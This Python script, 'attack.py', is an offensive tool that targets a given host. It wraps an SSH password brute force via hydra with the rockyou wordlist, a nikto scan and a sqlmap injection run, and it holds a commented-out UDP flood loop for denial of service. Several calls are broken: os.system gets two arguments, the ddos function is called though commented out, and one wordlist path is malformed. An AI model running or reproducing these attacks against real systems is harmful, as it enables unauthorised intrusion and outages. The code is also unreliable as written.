#!/usr/bin/python

""" attack.py
Usage:
    attack.py -h
    attack.py <host> [options]

Options:
    host
    -h,--help
    -d,--ddos
    -n,--nikto
    -b,--bruteforce
    -s,--sqlmap
"""
from docopt import docopt
import sys
import os
import time
import socket
import random

#Code Time
# from datetime import datetime
# now = datetime.now()
# hour = now.hour
# minute = now.minute
# day = now.day
# month = now.month
# year = now.year
port = 22


# SSH bruteforce
def bruteforce(ip):
    os.system("hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt %s -t 4 ssh"%(ip))

def nikto(ip):
    os.system("nikto -host %s", ip)

# DDOS
# def ddos(ip):
    # ##############
    # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # bytes = random._urandom(1490)
    # #############
    #
    # print "[ ] 0% "
    # time.sleep(5)
    # print "[===== ] 25%"
    # time.sleep(5)
    # print "[========== ] 50%"
    # time.sleep(5)
    # print "[=============== ] 75%"
    # time.sleep(5)
    # print "[====================] 100%"
    # time.sleep(3)
    # sent = 0
    # while True:
    #     sock.sendto(bytes, (ip,port))
    #     sent = sent + 1
    #     port = port + 1
    #     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
    #     if port == 65534:
    #         port = 1
#
def sqlmap(ip):
    os.system("sqlmap -u 'https://%s/index.php?name=abc' --threads=10", ip)

def main(args):
    if args["<host>"]:
        ip = args["<host>"]
        if args.get("--ddos"):
            ddos(ip)
        elif args.get("--nikto"):
            nikto(ip)
        elif args["--bruteforce"]:
            bruteforce(ip)
        elif args["--sqlmap"]:
            sqlmap(ip)
    else:
        print("Something went wrong")


if __name__ == '__main__':
    args = docopt(__doc__, version="Attack 1.0")
    main(args)

